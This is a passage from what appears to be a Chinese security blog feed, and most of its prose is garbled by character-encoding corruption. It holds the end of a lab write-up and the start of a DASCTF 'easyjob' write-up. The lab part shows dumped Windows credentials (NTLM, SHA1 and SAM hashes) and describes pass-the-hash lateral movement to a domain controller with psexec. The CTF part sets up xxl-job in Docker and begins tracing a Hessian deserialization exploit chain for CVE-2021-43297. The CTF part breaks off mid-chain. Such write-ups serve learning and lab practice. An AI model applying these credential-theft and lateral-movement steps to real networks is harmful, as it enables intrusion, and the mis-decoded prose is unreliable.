fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>kerberos :<br> * Username : win7$<br> * Domain   : SUN.COM<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 46807 (00000000:0000b6d7)<br>Session           : UndefinedLogonType from 0<br>User Name         : (null)<br>Domain            : (null)<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : <br>msv :<br> [00000003] Primary<br> * Username : WIN7$<br> * Domain   : SUN<br> * NTLM     : 19a799ef7003f143f69e5eb204369f74<br> * SHA1     : e7a55023d5275327b14b77af9fb37f9929ce114d<br>tspkg :<br>wdigest :<br>kerberos :<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 999 (00000000:000003e7)<br>Session           : UndefinedLogonType from 0<br>User Name         : WIN7$<br>Domain            : SUN<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-18<br>msv :<br>tspkg :<br>wdigest :<br> * Username : WIN7$<br> * Domain   : SUN<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>kerberos :<br> * Username : win7$<br> * Domain   : SUN.COM<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>ssp :<br>credman :<br></code></pre></td></tr></table></figure><p>ç®¡ç†å‘˜å¯†ç ç›¸å…³çš„ä¿¡æ¯æˆ‘ä»¬ä¹Ÿå·²ç»æ‰¾åˆ°äº†</p><p>ç”¨æˆ·å“ˆå¸Œä¹Ÿæ‹¿ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>heart:1000:aad3b435b51404eeaad3b435b51404ee:a34efdd63a23abea4413ba73cafa5a30:::<br></code></pre></td></tr></table></figure><h2 id="æ‰“åŸŸæ§"><a href="#æ‰“åŸŸæ§" class="headerlink" title="æ‰“åŸŸæ§"></a>æ‰“åŸŸæ§</h2><p>æ¥ä¸‹æ¥å°±æ˜¯è¦æ‹¿ä¸‹åŸŸæ§äº†</p><p>æ—¢ç„¶éƒ½æ‹¿åˆ°hashäº†é‚£å°±ç›´æ¥psexecæ¨ªå‘ç§»åŠ¨ä¸€æŠŠæ¢­äº†</p><p>å»ºç«‹ä¸€ä¸ªsmbç›‘å¬å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241121171441969.png" alt="image-20241121171441969"></p><p>ç„¶åç›´æ¥jump psexec</p><p><img src="https://cdn.clown2024.cn/image-20241121171456605.png" alt="image-20241121171456605"></p><p>æˆåŠŸä¸Šçº¿</p><p><img src="https://cdn.clown2024.cn/image-20241121171531530.png" alt="image-20241121171531530"></p><p><img src="https://cdn.clown2024.cn/image-20241121171543198.png" alt="image-20241121171543198"></p><p>psexecèƒ½ä¸€æŠŠæ¢­ä¸»è¦è¿˜æ˜¯DCä¸»æœºå¼€äº†$ADMINå…±äº«ç®¡é“</p><p><img src="https://cdn.clown2024.cn/image-20241121172048305.png" alt="image-20241121172048305"></p><p>è¿™å°é¶æœºæ¯”å‰é¢çš„ç®€å•æŒºå¤šçš„</p><p>å…¶å®åº”è¯¥win7é¶æœºç”¨æ™®é€šç”¨æˆ·ç™»å½•æ‰å¯¹ï¼Œè¿™æ ·æˆ‘ä»¬æ‰éœ€è¦ææƒ</p><p>æŸ¥æ‰¾ææƒæ¼æ´çš„è¯æˆ‘ä»¬å¯ä»¥ç”¨systeminfoä¿å­˜ä¸‹ç³»ç»Ÿä¿¡æ¯ï¼Œç„¶åç”¨wesngå·¥å…·æ¥æœç´¢</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python wes.py sysinfo.txt --impact <span class="hljs-string">&quot;Elevation of Privilege&quot;</span><br><span class="hljs-comment">#--impactæŒ‡å®šæ¼æ´ç±»å‹ä¸ºææƒæ¼æ´</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241121183215773.png" alt="image-20241121183215773"></p><p>ç„¶åå°±å¯ä»¥æ‰¾åˆ°å„ç§æ¼æ´ä¿¡æ¯äº†</p><p>expæ¼æ´åº“ï¼š<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCtf-easyjob</title>
      <link href="/2024/11/18/DASCtf-easyjob/"/>
      <url>/2024/11/18/DASCtf-easyjob/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ç”±äºé¢˜ç›®æ˜¯å…¬å…±é¶æœºç°åœ¨å·²ç»æŒ‚äº†ï¼Œæ‰€ä»¥å¤ç°éœ€è¦è‡ªå·±æ­å»ºé¢˜ç›®ç¯å¢ƒ</p><p>è·Ÿç€è¿™ç¯‡æ–‡ç« æ¥é…ç½®ä¸€ä¸‹ï¼š<a href="https://www.cnblogs.com/vickey-wu/p/9087951.html">https://www.cnblogs.com/vickey-wu/p/9087951.html</a></p><p>ä¸»è¦æ˜¯adminç»„ä»¶çš„é…ç½®ï¼Œå› ä¸ºä»–æ˜¯ä¸€ä¸ªwarï¼Œéœ€è¦éƒ¨ç½²åœ¨tomcatä¸Šï¼Œexecutoræ˜¯springbootåº”ç”¨ï¼Œç›´æ¥java -jarå°±è¡Œäº†</p><p><strong>mysqlé…ç½®</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¯åŠ¨æ•°æ®åº“</span><br>docker run -itd --name xxl-mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:5.6.40<br><span class="hljs-comment"># å¤åˆ¶sqlåˆ°å®¹å™¨ä¸­</span><br>docker <span class="hljs-built_in">cp</span> &lt;xxl-jobçš„sqlæ–‡ä»¶&gt; xxl-mysql:/tmp<br><span class="hljs-comment"># è¿›å…¥å®¹å™¨è¿æ¥æ•°æ®åº“</span><br>mysql -uroot -p123456<br><span class="hljs-comment"># æ‰§è¡Œå‘½ä»¤å¯¼å…¥æ•°æ®åº“</span><br><span class="hljs-built_in">source</span> /tmp/tables_xxl_job.sql<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119102349324.png" alt="image-20241119102349324"></p><p>ç„¶åæœ¬åœ°ç¼–è¯‘ä¸€ä¸‹xxl-jobçš„adminé¡¹ç›®ï¼Œæˆ‘ä»¬éœ€è¦ä»–waråŒ…è§£å‹åçš„æ–‡ä»¶å¤¹ï¼Œé…ç½®æ–‡ä»¶éœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œxxl.job.db.passwordå±æ€§æ”¹æˆåˆšåˆšçš„æ•°æ®åº“çš„å¯†ç </p><p>ç„¶åå†™ä¸€ä¸ªdockerfileæ„å»ºtomcatæœåŠ¡</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/tomcat:<span class="hljs-number">8.5</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br></code></pre></td></tr></table></figure><p>æ„å»ºé•œåƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker build -t xxl-admin:0.1 .<br></code></pre></td></tr></table></figure><p>å¯åŠ¨é•œåƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run -itd --name xxl-admin -p 8080:8080 xxl-admin:0.1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119105306668.png" alt="image-20241119105306668"></p><p>ç„¶åæœ¬åœ°ç¼–è¯‘xxl-job-executor-sample-springbootæ‰§è¡Œå™¨ï¼Œè¿™ä¸ªå’Œé¢˜ç›®çš„æ˜¯ä¸€æ ·çš„ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶çš„xxl.job.admin.addressesä¸º<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a></p><p>ç„¶åç›´æ¥java -jarå°±èƒ½è·‘èµ·æ¥äº†</p><p><img src="https://cdn.clown2024.cn/image-20241119105551883.png" alt="image-20241119105551883"></p><p>æˆ‘ä»¬çš„æ‰§è¡Œå™¨ä¹Ÿä¸Šçº¿äº†</p><p><img src="https://cdn.clown2024.cn/image-20241119105718265.png" alt="image-20241119105718265"></p><h2 id="docker-composeæ­å»º"><a href="#docker-composeæ­å»º" class="headerlink" title="docker-composeæ­å»º"></a>docker-composeæ­å»º</h2><p>æƒ³è‡ªå·±è¯•è¯•docker-composeæ­å»ºï¼Œæ²¡æœ‰æ€ä¹ˆæ­å»ºè¿‡å¤šå®¹å™¨çš„åº”ç”¨ï¼Œä½†æ˜¯æµªè´¹äº†å¥½å¤šæ—¶é—´å•Šå®åœ¨æ˜¯ï¼Œå¤ªæŠ˜ç£¨äº†</p><p>å…ˆç»™ä¸€ä¸ªæ€»çš„docker-compose.yaml</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">admin:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">./admin</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">admin</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8080:8080&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>  <span class="hljs-attr">executor:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">./executor</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">admin</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">executor</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9999:9999&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>  <span class="hljs-attr">db:</span><br>    <span class="hljs-attr">build:</span><br>      <span class="hljs-attr">context:</span> <span class="hljs-string">.</span><br>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">dockerfile</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">mysql</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;3306:3306&quot;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">xxl-job-network</span><br>    <span class="hljs-attr">command:</span> <span class="hljs-string">--default-authentication-plugin=mysql_native_password</span> <span class="hljs-comment">#è§£å†³å¤–éƒ¨æ— æ³•è®¿é—®</span><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">xxl-job-network:</span><br></code></pre></td></tr></table></figure><p><strong>å¯åŠ¨mysqlçš„dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/mysql:<span class="hljs-number">5.7</span><br><span class="hljs-comment"># è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œè®¾ç½® MySQL çš„ root å¯†ç </span><br><span class="hljs-keyword">ENV</span> MYSQL_ROOT_PASSWORD=<span class="hljs-number">123456</span><br><br><span class="hljs-comment"># å°† XXL-Job çš„ SQL è„šæœ¬å¤åˆ¶åˆ°å®¹å™¨ä¸­çš„ /tmp ç›®å½•</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./tables_xxl_job.sql /tmp/</span><br><span class="hljs-comment"># å¤åˆ¶åˆ°docker-entrypoint-initdb.dä¸­</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mv</span> /tmp/*.sql /docker-entrypoint-initdb.d</span><br><br><span class="hljs-comment"># å°† XXL-Job çš„ SQL è„šæœ¬å¤åˆ¶åˆ°å®¹å™¨ä¸­çš„ /docker-entrypoint-initdb.d ç›®å½•ï¼ŒMySQL å®˜æ–¹é•œåƒçš„ä¸€ä¸ªç‰¹æ€§ï¼šä»»ä½•æ”¾åœ¨ /docker-entrypoint-initdb.d/ ç›®å½•ä¸‹çš„ .sql æ–‡ä»¶éƒ½ä¼šåœ¨ MySQL æœåŠ¡å¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚</span><br><br><span class="hljs-keyword">ENV</span> LANG=C.UTF-<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘æƒ³ç€å‚è€ƒvulhubé‡Œçš„2.2ç‰ˆæœ¬çš„xxl-jobç¯å¢ƒæ¥è¿›è¡Œæ­å»ºï¼Œä½†æ˜¯åœ¨mavenç¼–è¯‘çš„æ—¶å€™æ€»ä¼šå‡ºé”™ï¼Œæˆ‘åªèƒ½é‡‡å–æœ¬åœ°å…ˆç¼–è¯‘ç„¶åå†å°†jaråŒ…ä¹‹ç±»çš„ç›´æ¥æ”¾å…¥</p><p><strong>adminçš„dockerfile</strong></p><p>ç¼–è¯‘å¥½ä¹‹åå°†è§£å‹çš„waråŒ…ç›®å½•æ”¾åœ¨dockerfileçš„ä¸Šä¸‹æ–‡ç›®å½•ä¸­</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/tomcat:<span class="hljs-number">8.5</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager \</span><br><span class="language-bash">&amp;&amp; <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf /tmp/*</span><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å‰éœ€è¦æ”¹ä¸€ä¸‹é…ç½®ï¼Œæˆ‘ä»¬è¿æ¥æ•°æ®åº“é‡‡ç”¨æœåŠ¡åçš„æ–¹å¼åœ¨docker-composeä¸­ï¼Œxxl.job.db.urlæ”¹æˆå¦‚ä¸‹ï¼š</p><figure class="highlight properties"><table><tr><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">xxl.job.db.url</span>=<span class="hljs-string">jdbc:mysql://db:3306/xxl-job?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¦æ³¨æ„ä¸€ä¸ªå‘ï¼Œåœ¨mysql5.7ä»¥ä¸Šè¿æ¥æ•°æ®åº“æ˜¯éœ€è¦é…ç½®useSSL&#x3D;falseæˆ–è€…trueè¿™ä¸ªé€‰é¡¹çš„ï¼Œä¸ç„¶è¿æ¥çš„æ—¶å€™ä¼šä¸€ç›´bad handshakeï¼Œè¢«å‘äº†å¥½ä¹…åœ¨è¿™é‡ŒğŸ˜­</p></blockquote><p><strong>æœ€åæ˜¯executorçš„dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> dockerpull.org/openjdk:<span class="hljs-number">8</span>u272-jre<br><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;clown&quot;</span></span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-executor-sample-springboot-1.9.2.jar /usr/src/xxl-job-executor-sample-springboot-1.9.2.jar</span><br><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /usr/src</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;-jar&quot;</span>, <span class="hljs-string">&quot;/usr/src/xxl-job-executor-sample-springboot-1.9.2.jar&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿæ˜¯å…ˆç¼–è¯‘å¥½ç„¶åæ”¾åˆ°dockerfileçš„ä¸Šä¸‹æ–‡ä¸­</p><p>åŒæ ·éœ€è¦ä¿®æ”¹ä¸€ä¸‹é…ç½®ï¼Œå°†xxl.job.admin.addressesæ”¹æˆå¦‚ä¸‹ï¼š</p><figure class="highlight properties"><table><tr><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">xxl.job.admin.addresses</span>=<span class="hljs-string">http://admin:8080/</span><br></code></pre></td></tr></table></figure><p>æˆ‘çš„æ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241119152118108.png" alt="image-20241119152118108"></p><p>é‡Œé¢æ··æ‚ç€ä¸€äº›æ²¡ç”¨çš„æ–‡ä»¶é—®é¢˜ä¸å¤§ï¼Œéƒ½æ˜¯å¤±è´¥çš„è¯•éªŒå“ğŸ˜­</p><p>æœ€å</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker compose up -d<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241119152217714.png" alt="image-20241119152217714"></p><p><img src="https://cdn.clown2024.cn/image-20241119152237897.png" alt="image-20241119152237897"></p><p>æˆåŠŸå¯åŠ¨ï¼</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/PeterJXL/p/18415349">https://www.cnblogs.com/PeterJXL/p/18415349</a></p><p><a href="https://www.cnblogs.com/vickey-wu/p/9087951.html">https://www.cnblogs.com/vickey-wu/p/9087951.html</a></p><p><a href="https://blog.csdn.net/lichaohao_10/article/details/127445796">https://blog.csdn.net/lichaohao_10/article/details/127445796</a></p><h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><p>å› ä¸ºè¿™é¢˜æ¶‰åŠåˆ°äº†HessianåŸç”Ÿååºåˆ—åŒ–ï¼Œåˆšå¥½è¿˜æœ‰ä¸€ç§æ–¹å¼æ²¡çœ‹ï¼Œè¿™é‡Œå°±é¡ºä¾¿ç®€å•å­¦ä¹ ä¸€ä¸‹</p><h2 id="hessiançš„tostingå¼‚å¸¸ååºåˆ—åŒ–"><a href="#Hessiançš„toStingå¼‚å¸¸ååºåˆ—åŒ–" class="headerlink" title="Hessiançš„toStingå¼‚å¸¸ååºåˆ—åŒ–"></a>Hessiançš„toStingå¼‚å¸¸ååºåˆ—åŒ–</h2><p>åŸç†æ˜¯å­—ç¬¦ä¸²å’Œå¯¹è±¡æ‹¼æ¥å¯¼è‡´éšå¼è§¦å‘äº†è¯¥å¯¹è±¡çš„toStringæ–¹æ³•ï¼Œè¯¥æ¼æ´æœ‰ä¸€ä¸ªcveï¼ŒCVE-2021-43297</p><p>è¿™ä¸ªCVEé’ˆå¯¹çš„æ˜¯Hessian2Input#expectï¼ŒHessian1åˆ™æ²¡æœ‰å¯¹åº”çš„é—®é¢˜ã€‚</p><h3 id="åˆ©ç”¨å…³é”®"><a href="#åˆ©ç”¨å…³é”®" class="headerlink" title="åˆ©ç”¨å…³é”®"></a>åˆ©ç”¨å…³é”®</h3><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹expectçš„å†™æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> IOException <span class="hljs-title function_">expect</span><span class="hljs-params">(String expect, <span class="hljs-type">int</span> ch)</span><br>    <span class="hljs-keyword">throws</span> IOException<br>  &#123;<br>    <span class="hljs-keyword">if</span> (ch &lt; <span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect + <span class="hljs-string">&quot; at end of file&quot;</span>);<br>    <span class="hljs-keyword">else</span> &#123;<br>      _offset--;<br><br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> _offset;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">context</span><br>          <span class="hljs-operator">=</span> buildDebugContext(_buffer, <span class="hljs-number">0</span>, _length, offset);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> readObject();<br><br>        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span>) &#123;<br>          <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                       + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>)<br>                       + <span class="hljs-string">&quot; &quot;</span> + obj.getClass().getName() + <span class="hljs-string">&quot; (&quot;</span> + obj + <span class="hljs-string">&quot;)&quot;</span><br>                       + <span class="hljs-string">&quot;\n  &quot;</span> + context + <span class="hljs-string">&quot;&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>          <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                       + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>) + <span class="hljs-string">&quot; null&quot;</span>);<br>      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        log.log(Level.FINE, e.toString(), e);<br><br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                     + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>));<br>      &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ¥å—äº†ä¸€ä¸ªexpectçš„Stringç±»å‹å˜é‡ï¼Œç„¶åè°ƒç”¨readObjectæ–¹æ³•è·å–äº†ä¸€ä¸ªå¯¹è±¡ï¼Œå†ç›´æ¥å°†expectå’Œobjå¯¹è±¡æ‹¼æ¥èµ·æ¥ï¼Œä»è€Œè§¦å‘äº†è¯¥å¯¹è±¡çš„toStringæ–¹æ³•</p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>å»æ‰¾ä¸€ä¸‹expectæ–¹æ³•çš„å¼•ç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241126230631856.png" alt="image-20241126230631856"></p><p>å¯ä»¥æ‰¾åˆ°å¤§éƒ¨åˆ†çš„readæ–¹æ³•éƒ½å¯ä»¥è°ƒç”¨expectæ–¹æ³•ï¼Œæ–‡ç« é€‰æ‹©çš„æ˜¯readStringï¼Œé‚£è¿™é‡Œä¹Ÿè·Ÿç€readStringæ¥</p><p>ç„¶åä¹Ÿæ˜¯é€šè¿‡æŸ¥æ‰¾å¼•ç”¨çš„æ–¹å¼æ‰¾readStringçš„è°ƒç”¨ï¼Œè¿™é‡Œå¼•ç”¨readStringçš„æ–¹æ³•ä¹Ÿå¾ˆå¤šï¼Œæ‰€ä»¥é¢å‘ç»“æœæŸ¥æ‰¾ï¼ˆ</p><p>å®Œæ•´çš„åˆ©ç”¨é“¾å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Hessian2Input#readObject --&gt; Hessian2Input#readObjectDefinition --&gt; Hessian2Input#readString --&gt; 